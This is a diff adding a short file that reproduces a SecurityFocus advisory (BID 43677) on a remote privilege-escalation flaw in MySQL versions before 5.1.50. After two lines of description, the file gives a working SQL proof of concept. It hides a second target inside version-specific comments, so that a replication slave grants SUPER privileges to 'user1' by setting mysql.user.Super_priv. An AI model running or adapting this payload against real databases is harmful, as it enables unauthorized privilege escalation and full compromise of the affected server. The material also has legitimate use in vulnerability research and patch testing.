@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/43677/info
+
+MySQL is prone to a remote privilege-escalation vulnerability.
+
+An attacker can exploit this issue to run arbitrary SQL statements with 'SUPER' privileges on the slave database system. This will allow the attacker to compromise the affected database system.
+
+This issue affects versions prior to MySQL 5.1.50. 
+
+UPDATE db1.tbl1 /*!514900 ,mysql.user */
+SET db1.tbl1.col1=2 /*!514900 ,mysql.user.Super_priv='Y'
+WHERE mysql.user.User='user1'*/; 
